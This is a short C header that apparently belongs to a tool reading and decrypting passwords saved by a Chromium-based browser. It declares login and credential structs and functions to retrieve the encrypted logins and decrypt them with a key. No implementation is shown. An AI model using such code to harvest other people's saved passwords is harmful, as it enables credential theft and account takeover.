#ifndef LOGINS_H
#define LOGINS_H

#include <windef.h>

// Encrypted credentials
typedef struct {
  PSTR url;
  PSTR username;
  PSTR passwordBlock;
  int passwordBlockSize;
} Login;

// Decrypted `Login`
typedef struct {
  PSTR url;
  PSTR username;
  PSTR password;
} Credential;

int chrmm_retrieve_logins(const PWSTR fullPath, int *loginCountOut,
                          Login **loginsOut);
int chrmm_decrypt_logins(Login logins[], int loginCount, const BYTE *key,
                         Credential *credentialsOut[], int *credentialCountOut);
void free_logins(Login logins[], int count);
void free_credentials(Credential logins[], int count);
void printLogin(Login login);
void printCredential(Credential credential);

#endif
